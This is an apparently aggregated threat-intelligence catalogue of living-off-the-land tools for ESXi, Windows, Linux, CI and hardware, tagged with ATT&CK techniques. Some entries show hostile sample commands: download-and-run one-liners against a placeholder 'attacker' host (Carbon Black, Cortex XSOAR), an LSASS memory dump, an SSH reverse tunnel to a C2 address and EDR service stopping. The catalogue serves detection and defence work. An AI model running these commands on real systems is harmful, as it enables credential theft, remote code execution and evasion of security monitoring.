# ESXi, Hardware, Certs & Misc Infrastructure
> Source: LOLESXi, LOTH, lolcerts, LOLApps, LOTP, Project-Lost, LOLBins-CTI | Entries: 130 | Platform: cross_platform, hardware, linux, windows


## Index

- [Adjust Performance](#adjust-performance)
- [C2](#c2)
- [Change File Permission](#change-file-permission)
- [cli](#cli)
- [config-file](#config-file)
- [Credential Access](#credential-access)
- [Data Exfiltration](#data-exfiltration)
- [Defense Evasion](#defense-evasion)
- [Delete file](#delete-file)
- [Disable Startup](#disable-startup)
- [Discovery](#discovery)
- [Execution](#execution)
- [Find Files](#find-files)
- [github-actions](#github-actions)
- [hardware](#hardware)
- [Inhibit Recovery](#inhibit-recovery)
- [leaked](#leaked)
- [Lists VMs](#lists-vms)
- [malicious](#malicious)
- [Malware Hosting](#malware-hosting)
- [Persistence](#persistence)
- [Phishing](#phishing)
- [Replace File](#replace-file)
- [Stop Service](#stop-service)
- [System Information](#system-information)
- [T1070.006](#t1070006)
- [T1489](#t1489)
- [T1572](#t1572)
- [TA0002:Execution:T1053.005](#ta0002executiont1053005)
- [TA0002:Execution:T1569.002](#ta0002executiont1569002)
- [TA0004:Privilege Escalation:T1548.002](#ta0004privilege-escalationt1548002)
- [TA0005:Defense Evasion:T1112](#ta0005defense-evasiont1112)
- [TA0005:Defense Evasion:T1218.010](#ta0005defense-evasiont1218010)
- [TA0009:Collection:T1560.001](#ta0009collectiont1560001)
- [TA0009:Persistence:T1197](#ta0009persistencet1197)
- [Uncategorized](#uncategorized)


### Adjust Performance

#### esxcfg-advcfg
A command-line utility available in VMware ESXi to manage advanced configuration settings. It allows administrators t...
**Categories:** Adjust Performance
```
esxcfg-advcfg -s 32768 /BufferCache/MaxCapacity
```

#### ulimit
A command line utility used to control the resource limits available to the shell and processes started by it. These...
**Categories:** Adjust Performance
```
ulimit -p $(ulimit -Hp) ulimit -n $(ulimit -Hn)
```

### C2

#### Wazuh
Wazuh is a security platform that provides unified XDR and SIEM protection for endpoints and cloud workloads. The sol...
**Categories:** C2, Execution

### Change File Permission

#### chmod
An inbuilt utility that allows user's to change file and folder permissions.; MITRE ATT&CK: T1222.002; Threat actors:...
**Categories:** Change File Permission, T1222.002
```
chmod a+x /tmp/<FILENAME>
```

### cli

#### ant
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### awk
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### bash
cli, config-file, env-var
**Categories:** cli, config-file, env-var

#### bundler
cli, eval-sh, config-file
**Categories:** cli, eval-sh, config-file

#### cargo
cli, eval-sh, config-file
**Categories:** cli, eval-sh, config-file

#### checkov
cli, config-file, eval-py
**Categories:** cli, config-file, eval-py

#### danger
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### deno
cli, config-file, eval-js
**Categories:** cli, config-file, eval-js

#### docker
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### earthly
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### eslint
cli, config-file, eval-js
**Categories:** cli, config-file, eval-js

#### flake8
cli, config-file, eval-py
**Categories:** cli, config-file, eval-py

#### gauge
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### gcloud
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### go generate
cli, input-file, eval-sh
**Categories:** cli, input-file, eval-sh

#### golangci-lint
cli, config-file, eval-go
**Categories:** cli, config-file, eval-go

#### gomplate
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### GoReleaser
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### gradle
cli, config-file, eval-groovy, eval-kotlin
**Categories:** cli, config-file, eval-groovy, eval-kotlin

#### java
cli, env-var
**Categories:** cli, env-var

#### just
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### mage
cli, config-file, eval-go
**Categories:** cli, config-file, eval-go

#### make
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### maven
cli, eval-sh, env-var, config-file
**Categories:** cli, eval-sh, env-var, config-file

#### mkdocs
cli, config-file, eval-py
**Categories:** cli, config-file, eval-py

#### MSBuild
cli, config-file, input-file, eval-sh
**Categories:** cli, config-file, input-file, eval-sh

#### mypy
cli, eval-sh, config-file
**Categories:** cli, eval-sh, config-file

#### npm
cli, config-file, eval-sh, eval-js
**Categories:** cli, config-file, eval-sh, eval-js

#### npx
cli, input-file, eval-js
**Categories:** cli, input-file, eval-js

#### PHPStan
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### pip
cli, input-file, eval-py, env-var
**Categories:** cli, input-file, eval-py, env-var

#### poetry
cli, input-file, eval-py
**Categories:** cli, input-file, eval-py

#### pre-commit
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### prettier
cli, config-file, eval-js
**Categories:** cli, config-file, eval-js

#### pylint
cli, config-file, eval-python
**Categories:** cli, config-file, eval-python

#### pytest
cli, config-file, eval-python
**Categories:** cli, config-file, eval-python

#### python
cli, env-var
**Categories:** cli, env-var

#### rake
cli, eval-sh, config-file
**Categories:** cli, eval-sh, config-file

#### rubocop
cli, eval-sh, config-file
**Categories:** cli, eval-sh, config-file

#### sed
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### SonarQube Scanner
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### stylelint
cli, config-file, eval-js
**Categories:** cli, config-file, eval-js

#### tar
cli, input-file, env-var
**Categories:** cli, input-file, env-var

#### terraform
cli, input-file, eval-sh
**Categories:** cli, input-file, eval-sh

#### tflint
cli, config-file, eval-sh
**Categories:** cli, config-file, eval-sh

#### trivy
cli, config-file
**Categories:** cli, config-file

#### unzip
cli, input-file
**Categories:** cli, input-file

#### uv
cli, input-file, eval-py
**Categories:** cli, input-file, eval-py

#### vale
cli, config-file
**Categories:** cli, config-file

#### webpack
cli, config-file, eval-js
**Categories:** cli, config-file, eval-js

#### wget
cli, env-var-and-config-file
**Categories:** cli, env-var-and-config-file

#### yarn
cli, config-file, eval-js
**Categories:** cli, config-file, eval-js

### config-file

#### Gemini CLI
config-file, eval-sh, cli
**Categories:** config-file, eval-sh, cli

### Credential Access

#### Nessus / Tenable.sc
Nessus is a vulnerability scanner. Attackers target stored scan credentials.

Credential Theft via Scan Server: Nessu...
**Categories:** Credential Access, Discovery, T1552
```
nessuscli lscreds
```

#### Sysinternals (ProcDump, PSExec, Sysmon)
Sysinternals tools such as ProcDump, PSExec, and Sysmon are widely used for troubleshooting, monitoring, and incident...
**Categories:** Credential Access, Defense Evasion, Lateral Movement, T1003.001, T1021.002, T1562.001
```
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

### Data Exfiltration

#### Dropbox
Data Exfiltration, Download
**Categories:** Data Exfiltration, Download

#### Zix Secure Messaging
Data Exfiltration, Download, Phishing
**Categories:** Data Exfiltration, Download, Phishing

### Defense Evasion

#### Carbon Black (EDR / Defense)
Carbon Black is an enterprise EDR platform used for process monitoring, threat detection, and incident response. When...
**Categories:** Defense Evasion, Execution, Credential Access, T1059, T1562.001, T1078
```
# Example pseudo Live Response usage (API / CLI)
cblr.exe -i <session_id> exec "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/p.ps1')"

# Stopping sensor service
sc stop carbonblack
```

#### Defender
Microsoft Defender is a built-in security solution in Windows that offers real-time protection against malware, explo...
**Categories:** Defense Evasion, T1564.012
```
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\path\to\folder\|*"
```

#### FortiAnalyzer / FortiSOAR / FortiEDR
Fortinet SOC tools can be abused by threat actors for command execution and disabling alerts.

Abusing Automation Wor...
**Categories:** Defense Evasion, Execution, T1059

#### GMER
GMER is an application that detects and removes rootkits. It scans for:
```
hidden processes
hidden threads
hidden mo...
**Categories:** Defense Evasion, T1562.001
```
& "C:\path	o\gmer.exe" -kill "ProcessName"
```

### Delete file

#### rm
Used to delete files or directories from an ESXi file system.; MITRE ATT&CK: T1070.004
**Categories:** Delete file, T1070.004
```
rm -f "/path/to/directory/*"
```

### Disable Startup

#### vim-cmd
A command-line utility in VMware ESXi that provides an interface to interact with the VMware Infrastructure (VI) API,...
**Categories:** Disable Startup, Enable Service, Inhibit Recovery, Power off VM, System Information, T1021.004, T1082, T1485, T1529
```
vim-cmd hostsvc/enable_ssh
```

### Discovery

#### OSQuery
osquery is an operating system instrumentation framework for Windows, OS X (macOS), and Linux. The tools make low-lev...
**Categories:** Discovery, T1033, T1082, T1016, T1057
```
osqueryi --json "SELECT username, description, sid, directory FROM users;"
```

### Execution

#### Cortex XSOAR
Cortex XSOAR is a SOAR platform used to orchestrate and automate incident response workflows across many tools and en...
**Categories:** Execution, Lateral Movement, Defense Evasion, T1059, T1021
```
- name: Malicious Playbook Step
  script: 'ssh-command'
  args:
    cmd: "curl http://attacker/payload.sh | bash"
```

#### Splunk Universal Forwarder
The Splunk Universal Forwarder (UF) is a lightweight agent used to forward logs to Splunk indexers and to receive con...
**Categories:** Execution, Defense Evasion, T1059, T1105
```
TA_malicious/
  bin/payload.ps1
  default/inputs.conf
```

#### Velociraptor
Velociraptor is a tool for collecting host based state information using The Velociraptor Query Language (VQL) querie...
**Categories:** Execution, T1059.003, T1059.001
```
velociraptor query --artifact "Windows.Sys.AllUsers" --json
```

### Find Files

#### find
A commandline utility that can be used to locate files and directories based on various criteria, such as name, type,...
**Categories:** Find Files, Find and Replace, Remove Evidence, T1070.004, T1083, T1491.001
```
find /vmfs/volumes/ -type f -name "*.vmdk"
```

### github-actions

#### actions/github-script
github-actions, injection, eval-js
**Categories:** github-actions, injection, eval-js

#### actions/setup-node
github-actions, config-file, eval-js
**Categories:** github-actions, config-file, eval-js

#### Local GHA
github-actions, eval-sh, config-file
**Categories:** github-actions, eval-sh, config-file

#### oxsecurity/megalinter
github-actions, config-file, eval-sh
**Categories:** github-actions, config-file, eval-sh

#### roots/issue-closer-action
github-actions, injection, eval-js
**Categories:** github-actions, injection, eval-js

#### sergeysova/jq-action
github-actions, injection, eval-sh
**Categories:** github-actions, injection, eval-sh

### hardware

#### Arduino Pro Micro
Hardware device: Arduino Pro Micro
**Categories:** hardware, arduino32u4

#### Cactus WHID
The Cactus WHID, developed by the open-source community and available on GitHub, is a covert and advanced keystroke i...
**Categories:** hardware, cactus, whid, 1B4F, 9207, hid

#### Digispark Attiny85
Hardware device: Digispark Attiny85
**Categories:** hardware, digisparkatmelattiny85

#### Flipper Zero
Hardware device: Flipper Zero
**Categories:** hardware, flipperusb

#### Hak5 Rubber Ducky
The Rubber Ducky, crafted by Hak5, is a discreet and highly sophisticated keystroke injection tool. Designed for adva...
**Categories:** hardware, hak5, rubber, ducky, 03EB, 2401, hid

#### Lilypad Attiny85
Hardware device: Lilypad Attiny85
**Categories:** hardware, lilypadattiny85atmel

#### Logitech Unifying Receiver
Hardware device: Logitech Unifying Receiver
**Categories:** hardware, logitech, unifying, c-u0012, c-u0007, 046d, usb, c52b

#### Nordic NRF52840
Hardware device: Nordic NRF52840
**Categories:** hardware, nordicnrf52840usblogitech

#### Sandisk Ultra 16GB
Hardware device: Sandisk Ultra 16GB
**Categories:** hardware, sandiskusbPS2251-03

#### Teensy
Hardware device: Teensy
**Categories:** hardware, teensyusbhalfkay

#### USB Nova
Hardware device: USB Nova
**Categories:** hardware, novaspacehuhn

### Inhibit Recovery

#### vmkfstools
A command-line utility in VMware ESXi used to manage and interact with VMFS (Virtual Machine File System) volumes.; M...
**Categories:** Inhibit Recovery, T1561.001
```
vmkfstools -c 10M -d eagerzeroedthick $I/eztDisk > /dev/null
```

### leaked

#### anydesk_leaked_certificate

**Categories:** leaked, code_signing

#### hangil_it_leaked_certificate

**Categories:** leaked, code_signing

#### lapsus_nvidia_leaked_certificate

**Categories:** leaked, code_signing

#### msi_leaked_certificate

**Categories:** leaked, code_signing

### Lists VMs

#### esxcli
esxcli is a command-line interface (CLI) tool (which is a python script) used to manage VMware ESXi hosts. Using esxc...
**Categories:** Lists VMs, T1082, T1087.001, T1489, T1491.001, T1562.001, T1562.004, T1562.012, account enumeration, change display information, disable service, discover network info, discover storage, modify logging, modify service, software operation, system information, terminate vm
```
esxcli --formatter=csv --format-param=fields=="WorldID,DisplayName" vm process list
```

#### ps
List process information from an ESXi host.; MITRE ATT&CK: T1082; Threat actors: E-Crime: Lockbit
**Categories:** Lists VMs, T1082
```
ps | grep vmx | grep "%s" | grep -v grep | awk '{print $2}' | sort -u
```

#### vm-support
A command-line utility in VMware ESXi that collects diagnostic information for troubleshooting and support purposes.;...
**Categories:** Lists VMs, T1082
```
vm-support --listvms
```

### malicious

#### hacking_team_malicious_certificate

**Categories:** malicious, code_signing

#### lamera_dprk_certificate

**Categories:** malicious, code_signing

### Malware Hosting

#### Discord
Malware Hosting, C2 Channel, DLL Hijacking
**Categories:** Malware Hosting, C2 Channel, DLL Hijacking

### Persistence

#### VS Code
Persistence, C2 Channel
**Categories:** Persistence, C2 Channel

### Phishing

#### Microsoft Visual Studio Tools for Office (VSTO)
Phishing, Persistence
**Categories:** Phishing, Persistence

### Replace File

#### mv
Used for moving or renaming files/folders within a file system.; MITRE ATT&CK: T1491; Threat actors: E-Crime: Nevada
**Categories:** Replace File, T1491
```
mv /etc/motd /etc/motd1
```

### Stop Service

#### systemctl
Manages the status of system services; MITRE ATT&CK: T1529; Threat actors: E-Crime: GwisinLocker
**Categories:** Stop Service, T1529
```
service $s stop
```

#### vpxa
Vpxa functions as an intermediary service that connects the vpxd service on the vCenter Server with the hostd service...
**Categories:** Stop Service, T1489
```
/etc/init.d/vpxa stop
```

### System Information

#### df
Provides disk utilisation statistics of attached volumes.; MITRE ATT&CK: T1082; Threat actors: E-Crime: RansomHouse
**Categories:** System Information, T1082
```
df -h -P -x"squashfs" | awk '{print $1"\t"$2"\t"$3"\t"$4"\t"$5"\t"$6}'
```

#### vmware
Binary that provides system information related to an ESXi host.; MITRE ATT&CK: T1082; Threat actors: E-Crime: Lockbit
**Categories:** System Information, T1082
```
vmware -v 2> /dev/null
```

### T1070.006

#### touch
Primarily used to create an empty file or to update the timestamp (modification and access time) of an existing file...
**Categories:** T1070.006, Timestomp
```
/bin/touch -r /etc/vmware/rhttpproxy/config.xml /etc/rc.local.d/local.sh
```

### T1489

#### kill
Allows manual termination of processes of interest.; MITRE ATT&CK: T1489; Threat actors: E-Crime: RansomHouse, E-Crim...
**Categories:** T1489, Terminate Process
```
kill -9 {process}
```

#### pkill
Forcefully terminates processes by performing a full or partial match based on the process name. It is commonly explo...
**Categories:** T1489, terminate process
```
pkill -9 %s
```

### T1572

#### ssh
Inbuilt SSH client used to remote port-forward using a tunnel.; MITRE ATT&CK: T1572
**Categories:** T1572, Tunnel Traffic
```
ssh –fN -R 127.0.0.1:<SOCKS port> <user>@<C2 IP address>
```

### TA0002:Execution:T1053.005

#### schtasks[.]exe
Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of mal...
**Categories:** TA0002:Execution:T1053.005, TA0003:Persistence:T1053.005, TA0004:Privilege Escalation:T1053.005, privilege:User

### TA0002:Execution:T1569.002

#### PsExec[.]exe
PsExec is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administr...
**Categories:** TA0002:Execution:T1569.002, TA0003:Persistence:T1136.002, TA0004:Privilege Escalation:T1543.003, TA0008:Lateral Movement:T1570, TA0008:Lateral Movement:T1021.002, privilege:User

### TA0004:Privilege Escalation:T1548.002

#### rundll32.exe
The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functio...
**Categories:** TA0004:Privilege Escalation:T1548.002, TA0006:Persis Credential Accesstence:T1555.004,T1003.001, TA0005:Defense Evasion:T1218.011, privilege:User

### TA0005:Defense Evasion:T1112

#### Reg.exe
Reg is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to...
**Categories:** TA0005:Defense Evasion:T1112, TA0007:Discovery:T1012, TA0006:Credential Access:T1552.002, privilege:User, privilege:Administrator

### TA0005:Defense Evasion:T1218.010

#### Regsvr32.exe
Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used...
**Categories:** TA0005:Defense Evasion:T1218.010, privilege:User

### TA0009:Collection:T1560.001

#### Certutil.exe
Command-line utility that can be used to obtain certificate authority information and configure Certificate Services.
**Categories:** TA0009:Collection:T1560.001, TA0005:Defense Evasion:T1140, TA0011:Command and Control:T1105, TA0005:Defense Evasion:T1553.004 , privilege:User

### TA0009:Persistence:T1197

#### BITSAdmin.exe
BITSAdmin is a command line tool used to create and manage BITS Jobs.
**Categories:** TA0009:Persistence:T1197, TA0005:Defense Evasion:T1197, TA0008:Lateral Movement:T1570, TA0010:Exfiltration:T1048.003, TA0011:Command and Control:T1105, privilege:User

### Uncategorized

#### Crowdstrike
Crowdstrike

#### Greenshot
Persistence

#### KeePass
Persistence

#### Notepad++
Persistence

#### ProcessExplorer
ProcessExplorer

#### QEMU
C2 Channel

#### Remote Desktop Connection
Lateral Movement

#### ShareX
Persistence

#### Sublime Text 3
Persistence

#### Windows Subsystem for Linux (WSL)
Persistence

#### Windows Terminal
Persistence

#### WinSCP
Persistence
